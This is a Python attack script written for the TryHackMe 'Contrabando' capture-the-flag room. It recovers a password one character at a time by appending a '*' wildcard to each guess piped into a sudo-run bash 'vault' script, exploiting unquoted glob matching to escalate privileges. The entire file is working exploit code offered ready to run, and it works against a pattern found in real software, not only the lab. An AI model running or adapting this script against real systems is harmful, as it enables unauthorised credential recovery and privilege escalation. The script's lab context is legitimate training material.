#!/usr/bin/env python3
import subprocess
import string
import sys

'''
Room Script: https://tryhackme.com/room/contrabando

Medium Article for explanation: https://medium.com/@Sle3pyHead/contrabando-ctf-notes-tryhackme-85017c242e7e
'''

# --- Configuration ---
# The command to execute for checking the password.
# It's recommended to use the full path to the executables.
CMD = ["sudo", "/usr/bin/bash", "/usr/bin/vault"]

# The character set to use for brute-forcing the password.
# Excludes characters that might interfere with shell globbing (*, ?, [, ]).
ALLOWED_CHARS = (
    string.ascii_letters + 
    string.digits + 
    string.punctuation.replace("*", "").replace("?", "").replace("[", "").replace("]", "")
)

# The success message to look for in the command's output.
SUCCESS_MESSAGE = "Password matched!"


def check_password_candidate(candidate: str) -> bool:
    """
    Runs the target command with a password candidate and checks if it's correct.
    
    The function appends a wildcard '*' to the candidate. This is a common technique
    for blind brute-force attacks where a partial match behaves differently than a full mismatch.
    
    Args:
        candidate: The partial or full password string to test.
        
    Returns:
        True if the success message is found in the output, False otherwise.
    """
    try:
        # The input is the password candidate followed by a wildcard and a newline.
        proc_input = f"{candidate}*\n"
        
        # Run the command, capturing both stdout and stderr into a single pipe.
        proc = subprocess.run(
            CMD,
            input=proc_input,
            text=True,
            capture_output=True, # A more modern way to capture stdout/stderr
            check=False # Do not raise an exception on non-zero exit codes
        )
        
        # Combine stdout and stderr for checking.
        output = proc.stdout + proc.stderr
        
        # Check if the success message is present in the output.
        return SUCCESS_MESSAGE in output

    except FileNotFoundError:
        print(f"\n[!] Error: Command not found. Is '{CMD[0]}' installed and in your PATH?", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}", file=sys.stderr)
        return False


def brute_force_password():
    """
    Iteratively builds the password by testing one character at a time.
    """
    found_password = ""
    print("[*] Starting brute-force attack...")
    
    try:
        while True:
            # Assume no new character will be found in this iteration.
            found_next_char = False
            
            # Iterate through all allowed characters to find the next one.
            for char_to_test in ALLOWED_CHARS:
                # Create the next password attempt.
                attempt = found_password + char_to_test
                
                # Update the user on the current attempt.
                # \r moves the cursor to the beginning of the line.
                # \033[2K clears the entire line.
                print(f"\033[2K\r[+] Trying: {attempt}", end="", flush=True)
                
                # Check if this attempt is a valid partial password.
                if check_password_candidate(attempt):
                    found_password += char_to_test
                    found_next_char = True
                    break # Move to the next character in the password
            
            # If no character worked, we assume the full password has been found.
            if not found_next_char:
                print(f"\n\033[2K\r[+] Success! Password found: {found_password}")
                break
                
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user.")
        if found_password:
            print(f"[*] Partial password found so far: {found_password}")


if __name__ == "__main__":
    brute_force_password()
